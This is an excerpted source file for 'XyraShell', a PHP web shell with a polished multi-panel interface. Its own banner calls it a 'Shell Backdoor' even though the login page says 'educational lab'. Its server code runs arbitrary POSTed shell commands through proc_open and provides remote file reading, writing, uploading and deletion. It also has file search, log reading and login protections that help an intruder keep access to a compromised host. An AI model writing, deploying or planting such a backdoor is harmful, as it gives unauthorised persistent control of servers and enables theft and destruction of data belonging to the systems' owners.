    ...
    if ($att >= $MAX_ATTEMPTS && time() - $lat < $LOCKOUT_TIME) {
        ...
        if (isset($USERS[$u]) && password_verify($p, $USERS[$u])) {
            ...
            $_SESSION = [
                ...
                'fp' => hash('sha256', ($_SERVER['HTTP_USER_AGENT'] ?? '') . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '')),
                'aliases' => ['ll' => 'ls -la', 'la' => 'ls -a', 'cls' => 'clear'],
                'pinned' => [], 'monitor_snap' => [],
            ];
...
body{min-height:100vh;background:#07090f;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;overflow:hidden;color:#e2e8f0}
#bg{position:fixed;inset:0;z-index:0}
#login{position:relative;z-index:10;width:340px}
.logo{font-family:'Space Grotesk',sans-serif;font-size:38px;font-weight:800;text-align:center;margin-bottom:6px;background:linear-gradient(135deg,#a855f7,#06b6d4,#10b981);-webkit-background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 0 30px rgba(168,85,247,.4))}
.tagline{text-align:center;font-size:9px;letter-spacing:.3em;color:#4a5568;margin-bottom:28px}
.box{background:rgba(15,20,35,.95);border:1px solid rgba(168,85,247,.2);border-radius:14px;padding:28px;backdrop-filter:blur(20px);box-shadow:0 25px 60px rgba(0,0,0,.6),inset 0 1px 0 rgba(255,255,255,.05)}
.box h2{font-family:'Space Grotesk',sans-serif;font-size:10px;color:#a855f7;letter-spacing:.2em;text-align:center;margin-bottom:18px}
.field{margin-bottom:12px}
.field label{display:block;font-size:8.5px;color:#4a5568;letter-spacing:.08em;margin-bottom:4px}
.field input{width:100%;background:rgba(0,0,0,.4);border:1px solid rgba(168,85,247,.15);color:#e2e8f0;font-family:'JetBrains Mono',monospace;font-size:12px;padding:9px 11px;border-radius:6px;outline:none;transition:all .2s}
.field input:focus{border-color:#a855f7;box-shadow:0 0 0 3px rgba(168,85,247,.1)}
.btn{width:100%;background:linear-gradient(135deg,#a855f7,#7c3aed);border:none;color:#fff;font-family:'Space Grotesk',sans-serif;font-size:11px;font-weight:700;padding:11px;border-radius:6px;cursor:pointer;letter-spacing:.1em;transition:all .2s;margin-top:4px}
.btn:hover{filter:brightness(1.15);box-shadow:0 0 25px rgba(168,85,247,.4)}
...
.dot:nth-child(1){background:#a855f7}.dot:nth-child(2){background:#06b6d4;animation-delay:.2s}.dot:nth-child(3){background:#10b981;animation-delay:.4s}
@keyframes pulse{0%,100%{opacity:.15;transform:scale(.8)}50%{opacity:1;transform:scale(1)}}
</style></head><body>
<canvas id="bg"></canvas>
<div id="login">
  <div class="logo">XyraShell</div>
  <div class="tagline">EDUCATIONAL CYBERSECURITY LAB v7</div>
  <div class="box">
    <h2>// AUTHENTICATE //</h2>
...
const colors=['rgba(168,85,247,.2)','rgba(6,182,212,.15)','rgba(16,185,129,.15)'];
const chars='XyraShellアイウエオカキ0123456789ABCDEF';
function draw(){
  ctx.fillStyle='rgba(7,9,15,.06)';ctx.fillRect(0,0,c.width,c.height);
  drops.forEach((y,i)=>{
...
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
    ...
    if ($action==='exec') {
        ...
        $proc=proc_open('cd '.escapeshellarg($cwd).' && '.$raw.' 2>&1',[1=>['pipe','w']],$pipes);
    ...
    if ($action==='autocomplete') {
        ...
        if(count($tokens)===1){$bi=array_merge(['cd','clear','history','exit','help'],array_keys($_SESSION['aliases']??[]));$ex=[];foreach(explode(':',getenv('PATH')) as $d){if(!is_dir($d))continue;foreach(scandir($d) as $f)if($f[0]!=='.'&&is_executable("$d/$f")&&str_starts_with($f,$last))$ex[]=$f;}$s=array_unique(array_merge(array_filter($bi,fn($b)=>str_starts_with($b,$last)),$ex));}
...
[data-theme="dark"]{
  ...
  --b:#21262d;--b2:#30363d;
  --a:#a855f7;--a2:#06b6d4;--a3:#10b981;
  --d:#f87171;--w:#fbbf24;--p:#f472b6;
  --t:#e6edf3;--dim:#8b949e;--faint:#484f58;
  --glow:0 0 20px rgba(168,85,247,.2);
  --glow2:0 0 20px rgba(6,182,212,.15);
}
[data-theme="midnight"]{
  --bg:#0a0a1a;--s:#0f0f2e;--s2:#14143d;--s3:#19194c;
  --b:#1f1f5a;--b2:#2a2a7a;
  --a:#818cf8;--a2:#38bdf8;--a3:#34d399;
  --d:#f87171;--w:#fbbf24;--p:#e879f9;
  --t:#e0e7ff;--dim:#6b7280;--faint:#374151;
  --glow:0 0 20px rgba(129,140,248,.25);--glow2:0 0 20px rgba(56,189,248,.2);
}
[data-theme="forest"]{
  --bg:#0a110a;--s:#0f1a0f;--s2:#162416;--s3:#1c2e1c;
  --b:#243824;--b2:#2e4a2e;
  --a:#4ade80;--a2:#86efac;--a3:#bbf7d0;
  --d:#f87171;--w:#fde68a;--p:#d9f99d;
  --t:#dcfce7;--dim:#6b7280;--faint:#374151;
  --glow:0 0 20px rgba(74,222,128,.25);--glow2:0 0 20px rgba(134,239,172,.15);
}
[data-theme="ember"]{
  --bg:#110a04;--s:#1a0f07;--s2:#24150a;--s3:#2e1c0d;
  --b:#3d2210;--b2:#4d2e14;
  --a:#f97316;--a2:#fb923c;--a3:#fbbf24;
  --d:#ef4444;--w:#eab308;--p:#f43f5e;
  --t:#fff7ed;--dim:#78716c;--faint:#44403c;
  --glow:0 0 20px rgba(249,115,22,.25);--glow2:0 0 20px rgba(251,146,60,.15);
}
[data-theme="light"]{
  --bg:#f6f8fa;--s:#ffffff;--s2:#f6f8fa;--s3:#eaeef2;
  --b:#d0d7de;--b2:#afb8c1;
  --a:#7c3aed;--a2:#0284c7;--a3:#059669;
  --d:#dc2626;--w:#d97706;--p:#db2777;
  --t:#1f2328;--dim:#57606a;--faint:#d0d7de;
...
.td-dark{background:linear-gradient(135deg,#a855f7,#06b6d4)}
.td-midnight{background:linear-gradient(135deg,#818cf8,#38bdf8)}
.td-forest{background:linear-gradient(135deg,#4ade80,#86efac)}
.td-ember{background:linear-gradient(135deg,#f97316,#fbbf24)}
.td-light{background:#f6f8fa;border-color:#d0d7de}
...
.pin-btn{background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.3);color:var(--a);font-family:'JetBrains Mono',monospace;font-size:8px;padding:2px 7px;border-radius:3px;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:3px}
.pin-btn:hover{background:rgba(168,85,247,.2)}.pin-x{opacity:.5;font-size:9px}.pin-x:hover{opacity:1;color:var(--d)}
...
#bulk-bar{display:none;gap:4px;align-items:center;flex-shrink:0;padding:3px 7px;background:rgba(168,85,247,.08);border:1px solid rgba(168,85,247,.3);border-radius:5px}
...
.ti:focus{border-color:var(--a);box-shadow:0 0 0 2px rgba(168,85,247,.1)}.ta{resize:vertical;min-height:55px}
...
.tb2:hover{background:rgba(168,85,247,.1);box-shadow:var(--glow)}
...
.ed-tab:hover{color:var(--t)}.ed-tab.on{color:var(--a);border-color:rgba(168,85,247,.3);background:var(--s3)}
...
<div id="app" style="opacity:0;transition:opacity .4s">
  ...
  <!-- Header -->
  <div id="hdr">
    <span id="logo">XyraShell <span style="font-size:8px;font-family:'JetBrains Mono',monospace;opacity:.5">v7</span></span>
    ...
    <div id="themes">
      <div class="td td-dark on"     title="Dark"     onclick="setTheme('dark')"></div>
      <div class="td td-midnight"    title="Midnight" onclick="setTheme('midnight')"></div>
      <div class="td td-forest"      title="Forest"   onclick="setTheme('forest')"></div>
      <div class="td td-ember"       title="Ember"    onclick="setTheme('ember')"></div>
      ...
      <div class="color-wrap" title="Custom" onclick="document.getElementById('color-in').click()">
        <input type="color" id="color-in" value="#a855f7" oninput="setCustomColor(this.value)">
      </div>
    </div>
      ...
      <div id="split-wrap">
        <div class="term-pane" id="pane1">
          ...
          <div class="term-out" id="terminal1">
            ...
            <div class="entry"><div class="eo info">  XyraShell — Shell Backdoor
  Powered by PHP <?=esc($phpver)?> | <?=esc($user)?>@<?=esc($hostname)?>
  Ketik 'help' untuk panduan. Ctrl+P = command palette.</div></div>
          </div>
          <div class="inbar">
        ...
        <div class="term-pane" id="pane2">
          ...
          <div class="term-out" id="terminal2">
            ...
            <div class="entry"><div class="eo info">Split terminal 2 siap.</div></div>
          </div>
          <div class="inbar">
    ...
    <div class="panel" id="panel-files">
      ...
      <div style="display:flex;flex:1;min-height:0;gap:4px">
        ...
        <div id="fm-main">
          <div id="fm-list"></div>
          <div id="fm-foot">
            <input id="fm-new" placeholder="nama folder..." onkeydown="if(event.key==='Enter')fmMkdir()">
    ...
    <div class="panel" id="panel-deep">
      <div class="dgrid">
        <div class="dcard"><div class="tt">🔍 Deep Search</div>
          <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="ds-dir" placeholder="<?=esc($cwd)?>"></div><div class="tf"><label>Query</label><input class="ti" id="ds-q" placeholder="cari..."></div></div>
          <div class="trow"><div class="tf"><label>Mode</label><select class="ti" id="ds-t"><option value="content">Isi file</option><option value="name">Nama file</option><option value="perm">Permission</option></select></div><div class="tf"><label>Ext</label><input class="ti" id="ds-e" placeholder="php,js..."></div><button class="tb2" onclick="doDS()">Search</button></div>
        ...
        <div class="dcard"><div class="tt">👁 Deep Monitor</div>
          ...
          <div class="rbox" id="dm-r">Ambil snapshot dulu.</div></div>
    ...
    <div class="panel" id="panel-hashing">
      <div class="tbox">
        ...
        <div class="trow"><div class="tf"><label>Input</label><input class="ti" id="hg-i" placeholder="teks..."></div><button class="tb2" onclick="doHashGen()">Generate</button></div>
    ...
    <div class="panel" id="panel-strings">
      <div class="tbox">
        ...
        <div class="tf"><label>Input</label><textarea class="ti ta" id="st-i" rows="3" placeholder="teks..."></textarea></div>
    ...
    <div class="panel" id="panel-security">
      <div class="dgrid">
        ...
        <div class="dcard"><div class="tt">📋 Log Analyzer</div>
          ...
          <input class="ti" id="la-c" placeholder="atau custom path..." style="font-size:9px;margin-top:2px">
      ...
      <div style="display:flex;flex-direction:column;flex:1;min-height:0;gap:5px">
        ...
        <div id="cvep-lookup" style="display:flex;flex-direction:column;gap:5px;flex:1;min-height:0">
          <div class="tbox" style="flex:unset">
            ...
            <div style="font-size:8px;color:var(--dim)">Data real-time dari nvd.nist.gov | Ctrl+Shift+C = quick lookup</div>
          </div>
          <div class="rbox" id="cve-l-r" style="flex:1;max-height:none;min-height:80px">Masukkan CVE ID lalu klik Lookup.</div>
        </div>
        ...
        <div id="cvep-recent" style="display:none;flex-direction:column;gap:5px;flex:1;min-height:0">
          <div class="tbox" style="flex:unset">
            ...
            <div style="display:flex;gap:6px;align-items:center"><button class="tb2" onclick="doCVER()">↺ Load</button><span style="font-size:8px;color:var(--dim)">Klik ID CVE untuk lookup detail</span></div>
          </div>
          <div class="rbox" id="cve-r-r" style="flex:1;max-height:none;min-height:80px">Klik Load untuk memuat CVE terbaru.</div>
        </div>
      </div>
    </div>
    ...
    <div class="panel" id="panel-sysinfo">
      <div class="tbox">
        ...
        <div id="alog"><div style="color:var(--dim);font-size:8.5px">Klik Load...</div></div>
        <div class="tt">🔑 Ganti Password</div>
        <div class="trow">
          <div class="tf"><label>Lama</label><input class="ti" type="password" id="cp-o"></div>
          <div class="tf"><label>Baru (min 6)</label><input class="ti" type="password" id="cp-n"></div>
          <button class="tb2" onclick="chgPass()">Ganti</button>
        </div>
      </div>
    </div>
...
CSRF Token: <b>Aktif</b> | Rate Limit: <b>Aktif</b> | Session FP: <b>Aktif</b>
...
Session: <b><?=esc(substr(session_id(),0,16))?>...</b></div>
      ...
      <div class="tbox">
        ...
        <div id="cs-grid">
          ...
          <div class="cs-s"><h3>Editor</h3>
            ...
            <div class="cs-r"><span class="cs-k">Auto-save</span><span class="cs-d">30 detik</span></div>
          </div>
          ...
          <div class="cs-s"><h3>CVE & Security</h3>
            ...
            <div class="cs-r"><span class="cs-k">Perm Audit</span><span class="cs-d">Cek permission</span></div>
            <div class="cs-r"><span class="cs-k">Log Analyzer</span><span class="cs-d">Deteksi suspicious</span></div>
          ...
          <div class="cs-s"><h3>Commands</h3>
            ...
            <div class="cs-r"><span class="cs-k">find / -name</span><span class="cs-d">Cari file</span></div>
          ...
          <div class="cs-s"><h3>Themes</h3>
            <div class="cs-r"><span class="cs-k">Dark</span><span class="cs-d">Purple/Cyan</span></div>
            <div class="cs-r"><span class="cs-k">Midnight</span><span class="cs-d">Indigo/Blue</span></div>
            <div class="cs-r"><span class="cs-k">Forest</span><span class="cs-d">Green</span></div>
            <div class="cs-r"><span class="cs-k">Ember</span><span class="cs-d">Orange/Amber</span></div>
            <div class="cs-r"><span class="cs-k">Light</span><span class="cs-d">Clean white</span></div>
    ...
    <div class="panel" id="panel-about">
      <div class="tbox">
        ...
        <div class="ag">
          <div class="ac2"><label>Shell</label><p>XyraShell</p></div>
          ...
          <div class="ac2"><label>Features</label><p>Terminal, Files, Deep, Security, CVE, Network, Hash, Strings</p></div>
  ...
  <div id="statusbar">
    ...
    <div class="sb-item">XyraShell</div>
  </div>
</div><!-- /app -->
...
<div class="overlay" id="upload-ov">
  <div class="modal">
    ...
    <div id="dz" onclick="document.getElementById('up-f').click()" ondragover="event.preventDefault();this.classList.add('drag')" ondragleave="this.classList.remove('drag')" ondrop="handleDrop(event)">
      ...
      <div>🗂 Drag & drop atau klik</div>
      <div style="font-size:8px;margin-top:3px;color:var(--dim)">Upload ke: <span id="up-dir">—</span></div>
    </div>
...
<div id="palette" style="display:none;position:fixed;top:15%;left:50%;transform:translateX(-50%);background:var(--s);border:1px solid var(--a);border-radius:10px;padding:12px;z-index:950;min-width:420px;max-width:92vw;box-shadow:0 16px 50px rgba(0,0,0,.7);backdrop-filter:blur(10px)">
  ...
  <input id="pal-in" style="width:100%;background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:11px;padding:7px 9px;border-radius:5px;outline:none;transition:border-color .2s" placeholder="cari command atau ketik...">
...
<div id="hist-srch" style="display:none;position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:var(--s2);border:1px solid var(--a);border-radius:8px;padding:10px;z-index:900;min-width:370px;box-shadow:0 8px 30px rgba(0,0,0,.6)">
  <div style="font-size:8px;color:var(--dim);letter-spacing:.1em;margin-bottom:6px">⌛ HISTORY SEARCH (ESC tutup)</div>
  <input id="hs-in" style="width:100%;background:var(--s3);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:11px;padding:5px 8px;border-radius:4px;outline:none" placeholder="cari...">
...
<div id="ml-ov" style="display:none;position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:var(--s);border:1px solid var(--a);border-radius:8px;padding:12px;z-index:900;min-width:420px;max-width:90vw;box-shadow:0 8px 30px rgba(0,0,0,.6)">
  <div style="font-size:8px;color:var(--dim);margin-bottom:7px">📝 MULTI-LINE (Ctrl+Enter = run, Esc = tutup)</div>
  <textarea id="ml-in" style="width:100%;height:110px;background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:10.5px;padding:7px;border-radius:5px;outline:none;resize:vertical;tab-size:4" placeholder="Commands, satu per baris..."></textarea>
  <div style="display:flex;gap:6px;margin-top:7px">
    <button onclick="closeML()" style="flex:1;background:transparent;border:1px solid var(--b);color:var(--dim);font-family:'JetBrains Mono',monospace;font-size:9px;padding:5px;border-radius:4px;cursor:pointer">Tutup</button>
...
async function runCmd(pane=1){
  ...
  if(cmd==='exit'){addEntry(pane,ps1(pane,st.cwd,cmd),'');addEntry(pane,'','Session ditutup.','info');inp.disabled=true;document.getElementById('run-btn'+pane).disabled=true;return;}
...
[1,2].forEach(pane=>{
  ...
  inp.addEventListener('keydown',e=>{
    ...
    if(e.key==='ArrowDown'){e.preventDefault();if(st.hidx>0){st.hidx--;inp.value=st.hist[st.hist.length-1-st.hidx];}else{st.hidx=-1;inp.value=st.temp;}return;}
...
function renderFM(){
  ...
  list.innerHTML=items.map(item=>{
    ...
    const acts=`<div style="display:flex;gap:1px">
      ...
      <button class="fma del" onclick="event.stopPropagation();fmDel('${fE}','${nE}')" title="Hapus">🗑</button>
    </div>`;
  ...
  }).join('')||'<div style="padding:9px;color:var(--dim);font-size:9px">Kosong</div>';
}
...
function updBulk(){const b=document.getElementById('bulk-bar'),n=selFiles.size;b.className=n>0?'show':'';document.getElementById('bulk-count').textContent=n+' dipilih';}
async function bulkDel(){if(!selFiles.size)return;if(!confirm('Hapus '+selFiles.size+' file?'))return;const r=await post({action:'bulk_delete',files:JSON.stringify([...selFiles])});toast(r.msg,r.ok?'ok':'err');clearSel();fmLoad(fmDir);}
...
async function fmDel(full,name){if(!confirm('Hapus "'+name+'"?'))return;const r=await post({action:'delete',file:full});toast(r.ok?'Dihapus: '+name:'Gagal: '+(r.msg||''),r.ok?'ok':'err');if(r.ok)fmLoad(fmDir);}
...
async function fmMkdir(){const n=document.getElementById('fm-new').value.trim();if(!n)return;const r=await post({action:'mkdir_action',name:n});toast(r.ok?'Dir dibuat!':'Gagal',r.ok?'ok':'err');document.getElementById('fm-new').value='';if(r.ok)fmLoad(fmDir);}
...
async function fmPrev(full){const r=await post({action:'read',file:full});if(!r.ok){toast('Tidak bisa preview','err');return;}const pid='pv-'+btoa(full).replace(/[^a-z0-9]/gi,'').slice(0,18);const box=document.getElementById(pid);if(!box)return;if(box.classList.contains('on')){box.classList.remove('on');return;}box.textContent=r.content.substring(0,400)+(r.content.length>400?'\n...':'');box.classList.add('on');}
function copyPath(full){navigator.clipboard?.writeText(full).then(()=>toast('Path copied!','ok')).catch(()=>toast('Copy gagal','err'));}
...
function edCloseByIdx(i){if(!edFiles[i].saved&&!confirm('Belum tersimpan. Tutup?'))return;edFiles.splice(i,1);if(!edFiles.length){closeOv('ed-ov');clearAS();return;}edIdx=Math.min(edIdx,edFiles.length-1);renderEdTabs();loadEdContent();}
...
async function saveFile(){if(!edFiles[edIdx])return;const f=edFiles[edIdx];const r=await post({action:'write',file:f.path,content:document.getElementById('ed-area').value});const s=document.getElementById('ed-status');if(r.ok){f.saved=true;f.content=document.getElementById('ed-area').value;renderEdTabs();}s.textContent=r.ok?'✓ Saved':'✗ Error';s.style.color=r.ok?'var(--a3)':'var(--d)';toast(r.ok?'Tersimpan!':r.msg||'Gagal',r.ok?'ok':'err');}
...
console.log('[XyraShell] All modules loaded ✓');
</script>
</body>
</html>
